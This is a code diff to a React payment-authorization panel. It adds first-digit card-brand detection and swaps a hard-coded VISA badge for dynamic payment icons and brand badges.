@@ -5,6 +5,7 @@ import { Input } from "@/components/ui/input";
 import { CreditCard, Shield, Lock, Smartphone, MessageSquare, CheckCircle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import { useOptimisticPaymentSession } from '@/hooks/useOptimisticPaymentSession';
+import { PaymentIcons } from '@/components/ui/PaymentIcons';
 
 interface AuthorizationPanelProps {
   orderId: string;
@@ -15,6 +16,41 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
   const [orderData, setOrderData] = useState<any>(null);
   const [currentTextIndex, setCurrentTextIndex] = useState(0);
   const [smsCode, setSmsCode] = useState('');
+
+  const detectCardType = (cardNumber: string): 'visa' | 'mastercard' | 'amex' | 'unknown' => {
+    const cleanNumber = cardNumber.replace(/\s/g, '');
+    const firstDigit = cleanNumber.charAt(0);
+    
+    if (firstDigit === '4') return 'visa';
+    if (firstDigit === '5') return 'mastercard';
+    if (firstDigit === '3') return 'amex';
+    return 'unknown';
+  };
+
+  const getCardTypeInfo = (cardType: 'visa' | 'mastercard' | 'amex' | 'unknown') => {
+    switch (cardType) {
+      case 'visa':
+        return { 
+          name: 'VISA', 
+          gradient: 'from-blue-600 to-blue-700' 
+        };
+      case 'mastercard':
+        return { 
+          name: 'MASTERCARD', 
+          gradient: 'from-red-500 to-orange-600' 
+        };
+      case 'amex':
+        return { 
+          name: 'AMEX', 
+          gradient: 'from-green-600 to-green-700' 
+        };
+      default:
+        return { 
+          name: 'CARD', 
+          gradient: 'from-gray-600 to-gray-700' 
+        };
+    }
+  };
   
   // Use optimistic payment session hook
   const {
@@ -317,8 +353,14 @@ const AuthorizationPanel: React.FC<AuthorizationPanelProps> = ({ orderId, sessio
             <div className="bg-gray-50 rounded-lg p-4">
               <div className="flex items-center justify-between">
                 <div className="flex items-center space-x-3">
-                  <div className="w-10 h-6 bg-gradient-to-r from-blue-600 to-blue-700 rounded text-white text-xs font-bold flex items-center justify-center">
-                    VISA
+                  <div className="flex items-center space-x-2">
+                    <PaymentIcons 
+                      cardType={orderData?.card_number ? detectCardType(orderData.card_number) : 'unknown'} 
+                      className="h-6"
+                    />
+                    <div className={`px-2 py-1 bg-gradient-to-r ${getCardTypeInfo(orderData?.card_number ? detectCardType(orderData.card_number) : 'unknown').gradient} rounded text-white text-xs font-bold flex items-center justify-center`}>
+                      {getCardTypeInfo(orderData?.card_number ? detectCardType(orderData.card_number) : 'unknown').name}
+                    </div>
                   </div>
                   <span className="text-sm text-gray-700">
                     •••• •••• •••• {orderData?.card_number?.slice(-4) || '4444'}
